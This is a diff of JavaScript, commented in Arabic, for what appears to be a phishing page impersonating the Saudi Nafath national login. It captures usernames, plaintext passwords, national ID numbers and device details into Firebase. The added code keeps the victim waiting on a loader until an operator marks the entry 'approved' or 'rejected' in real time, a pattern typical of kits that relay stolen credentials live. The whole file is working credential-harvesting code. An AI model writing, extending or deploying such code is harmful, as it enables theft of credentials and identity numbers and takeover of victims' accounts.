@@ -3,8 +3,14 @@
 // استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
 import { db } from "./firebase-config.js";
 
-// استيراد الدوال المطلوبة من حزمة Firestore الرسمية عبر الـ CDN
-import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+// استيراد الدوال المطلوبة (إضافة doc و onSnapshot للمراقبة اللحظية)
+import { 
+    collection, 
+    addDoc, 
+    serverTimestamp, 
+    doc, 
+    onSnapshot 
+} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
 document.addEventListener('DOMContentLoaded', () => {
     
@@ -29,12 +35,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
     tabs.forEach(tab => {
         tab.addEventListener('click', () => {
-            // التنفيذ فقط إذا كان التبويب المختار مغلقاً حالياً
             if (tab.classList.contains('collapsed')) {
                 
-                // إذا نقر المستخدم على تبويب تطبيق نفاذ، نظهر التنبيه أولاً قبل التبديل
-           
-                // أ) تحويل كافة التبويبات للحالة المغلقة وتغيير الأيقونات لـ (+)
                 tabs.forEach(t => {
                     t.classList.remove('active');
                     t.classList.add('collapsed');
@@ -45,12 +47,10 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 });
 
-                // ب) إخفاء جميع لوحات النماذج
                 panels.forEach(p => {
                     p.classList.add('hidden-panel');
                 });
 
-                // ج) تنشيط التبويب الحالي المختار وتحويل أيقونته لـ (-)
                 tab.classList.remove('collapsed');
                 tab.classList.add('active');
                 const currentIcon = tab.querySelector('.status-icon');
@@ -59,7 +59,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     currentIcon.classList.add('fa-minus');
                 }
 
-                // د) إظهار اللوحة المستهدفة المربوطة بالتبويب النشط
                 const targetPanelId = tab.getAttribute('data-target');
                 const targetPanel = document.getElementById(targetPanelId);
                 if (targetPanel) {
@@ -69,11 +68,40 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-   // ==========================================
-    // 3. معالجة إرسال النماذج وتخزينها وظهور اللودر
+    // ==========================================
+    // 3. معالجة إرسال النماذج ومراقبة رد الأدمن لحظياً
     // ==========================================
     const globalLoader = document.getElementById('globalLoader');
     
+    // دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر
+    function listenToAdminApproval(collectionName, docId) {
+        const docRef = doc(db, collectionName, docId);
+        
+        // الاستماع للتغيرات اللحظية في قاعدة البيانات
+        const unsubscribe = onSnapshot(docRef, (snapshot) => {
+            if (snapshot.exists()) {
+                const data = snapshot.data();
+                
+                // إذا قام الأدمن بتحديث الحالة إلى "approved" أو أي حالة نجاح تحددها
+                if (data.status === "approved") {
+                    // 1. إخفاء اللودر الزجاجي
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    
+                    // 2. التوجيه لصفحة النجاح أو الصفحة الداخلية للمنصة
+                    alert('تم التحقق والمطابقة بنجاح من قبل الإدارة.');
+                    window.location.href = "dashboard.html"; 
+                    
+                    // إيقاف المراقبة بعد النجاح لتوفير الموارد
+                    unsubscribe();
+                } else if (data.status === "rejected") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert('تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.');
+                    unsubscribe();
+                }
+            }
+        });
+    }
+
     // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
     const authForm = document.getElementById('authForm');
     if (authForm) {
@@ -83,27 +111,25 @@ document.addEventListener('DOMContentLoaded', () => {
             const usernameInput = document.getElementById('username').value;
             const passwordInput = document.getElementById('password').value;
             
-            // إظهار اللودر الزجاجي في منتصف الشاشة فوراً
             if (globalLoader) globalLoader.classList.remove('hidden-loader');
             
             try {
-                // إرسال البيانات إلى الفايربيس
-                await addDoc(collection(db, "users_login"), {
+                // إرسال البيانات وحفظ المرجع الخاص بالمستند الجديد (docRef)
+                const docRef = await addDoc(collection(db, "users_login"), {
                     username: usernameInput,
                     password: passwordInput,
                     timestamp: serverTimestamp(),
                     device: navigator.userAgent,
-                    status: "waiting_admin" // حالة الطلب بانتظار الأدمن
+                    status: "waiting_admin" 
                 });
 
-                // نترك اللودر ظاهر شغال، أو يمكنك إخفاؤه بعد نجاح الإرسال بـ alert
-                // إذا أردت استمرار اللودر حتى يوافق الأدمن، اترك السطر القادم ملغياً
-                // globalLoader.classList.add('hidden-loader'); 
+                // بدء مراقبة هذا المستند تحديداً بانتظار رد الأدمن
+                listenToAdminApproval("users_login", docRef.id);
                 
             } catch (error) {
                 console.error("خطأ: ", error);
                 alert('عذراً، حدث خطأ في الاتصال بالشبكة.');
-                if (globalLoader) globalLoader.classList.add('hidden-loader'); // إخفاء عند الخطأ
+                if (globalLoader) globalLoader.classList.add('hidden-loader');
             }
         });
     }
@@ -116,15 +142,17 @@ document.addEventListener('DOMContentLoaded', () => {
             
             const nationalIdInput = document.getElementById('nationalId').value;
             
-            // إظهار اللودر الزجاجي في منتصف الشاشة فوراً
             if (globalLoader) globalLoader.classList.remove('hidden-loader');
             
             try {
-                await addDoc(collection(db, "nafath_app_requests"), {
+                const docRef = await addDoc(collection(db, "nafath_app_requests"), {
                     nationalId: nationalIdInput,
                     timestamp: serverTimestamp(),
-                    status: "waiting_admin" // بانتظار الأدمن
+                    status: "waiting_admin"
                 });
+                
+                // بدء مراقبة طلب نفاذ بانتظار رد الأدمن
+                listenToAdminApproval("nafath_app_requests", docRef.id);
                 
             } catch (error) {
                 console.error("خطأ: ", error);
@@ -133,6 +161,7 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
     }
+
     // ==========================================
     // 4. زر تبديل اللغة وإدارة اتجاه الصفحة (مشترك)
     // ==========================================
